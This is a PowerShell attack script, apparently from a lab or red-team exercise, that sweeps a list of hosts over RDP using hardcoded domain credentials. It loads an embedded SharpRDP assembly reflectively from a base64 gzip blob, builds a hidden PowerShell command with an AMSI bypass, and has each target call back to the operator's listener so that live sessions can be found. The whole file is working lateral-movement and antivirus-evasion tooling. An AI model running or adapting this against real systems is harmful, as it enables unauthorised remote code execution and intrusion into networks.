param(
    [string[]]$Targets    = @('10.3.10.10','10.3.10.11','10.3.10.12','10.3.10.22','10.3.10.23'),
    [string]  $Username   = "NORTH\hodor",
    [string]  $Password   = "hodor",
    [string]  $OperatorIP = "10.3.10.157",
    [int]     $CbPort     = 9595
)

$root    = Split-Path -Parent $PSScriptRoot
$cbTok   = "SWEEP_" + (-join ((65..90) | Get-Random -Count 6 | % { [char]$_ }))
$domain  = $Username.Split('\')[0]
$user    = $Username.Split('\')[-1]

Write-Host "[*] CB token: $cbTok  Port: $CbPort" -ForegroundColor Cyan
netsh advfirewall firewall add rule name="AmnesiacSweep$CbPort" dir=in action=allow protocol=tcp localport=$CbPort 2>&1 | Out-Null

# Start HTTP callback listener
$cbJob = Start-Job -ScriptBlock {
    param($port)
    $l = [Net.HttpListener]::new()
    $l.Prefixes.Add("http://+:$port/")
    try { $l.Start() } catch { Write-Output "[-] Listen fail: $_"; return }
    Write-Output "[+] CB listening on $port"
    $dl = (Get-Date).AddSeconds(150)
    while ((Get-Date) -lt $dl) {
        try {
            $t = $l.BeginGetContext($null, $null)
            if ($t.AsyncWaitHandle.WaitOne(500)) {
                $ctx = $l.EndGetContext($t)
                Write-Output "[+] HIT: $($ctx.Request.Url.LocalPath) from $($ctx.Request.RemoteEndPoint.Address)"
                $ctx.Response.StatusCode = 200
                $ctx.Response.OutputStream.Close()
            }
        } catch { break }
    }
    try { $l.Stop() } catch {}
} -ArgumentList $CbPort
Start-Sleep 2
Receive-Job $cbJob | ForEach-Object { Write-Host $_ -ForegroundColor Green }

# Load SharpRDP
$srdpPath = Join-Path $root "Tools\Invoke-SharpRDP.ps1"
$src      = [IO.File]::ReadAllText($srdpPath)
$m        = [regex]::Match($src, '"(H4sI[A-Za-z0-9+/=]{100,})"')
if (-not $m.Success) { Write-Host "[-] SharpRDP blob not found" -ForegroundColor Red; exit 1 }
$ms1  = New-Object IO.MemoryStream(, [Convert]::FromBase64String($m.Groups[1].Value))
$gz   = New-Object IO.Compression.GzipStream($ms1, [IO.Compression.CompressionMode]::Decompress)
$ms2  = New-Object IO.MemoryStream
$gz.CopyTo($ms2); $gz.Close(); $ms1.Close()
[Reflection.Assembly]::Load($ms2.ToArray()) | Out-Null
Write-Host "[+] SharpRDP loaded" -ForegroundColor Green

$amsi = "[ref].assembly.gettype('system.management.automation.amsiutils',`$false,`$true).getfield('amsiinitfailed',41).setvalue(`$null,`$true)"
$cb   = "(new-object net.webclient).downloadstring('http://${OperatorIP}:${CbPort}/${cbTok}') | out-null"
$cmd  = "powershell -nop -ep bypass -w hidden -c `"$amsi;$cb`""

foreach ($tgt in $Targets) {
    Write-Host "`n[*] exec=cmd -> $tgt ..." -ForegroundColor Cyan
    & net use "\\$tgt\IPC`$" "/user:$domain\$user" $Password 2>&1 | Out-Null
    [SharpRDP.Program]::Main(@(
        "computername=$tgt",
        "username=$Username",
        "password=$Password",
        "command=$cmd",
        "exec=cmd"
    ))
    $out = Receive-Job $cbJob
    if ($out) { Write-Host $out -ForegroundColor Green }
    & net use "\\$tgt\IPC`$" /delete 2>&1 | Out-Null
}

Write-Host "`n[*] Waiting 25s for any late callbacks..." -ForegroundColor Cyan
$dl = (Get-Date).AddSeconds(25)
while ((Get-Date) -lt $dl) {
    $out = Receive-Job $cbJob
    if ($out) {
        Write-Host $out -ForegroundColor Green
        if ($out -match 'HIT') { Write-Host "[+] ACTIVE SESSION FOUND!" -ForegroundColor Green }
    }
    Start-Sleep 1
}

Stop-Job $cbJob; Remove-Job $cbJob
netsh advfirewall firewall delete rule name="AmnesiacSweep$CbPort" 2>&1 | Out-Null
Write-Host "`n[*] Sweep done." -ForegroundColor Cyan
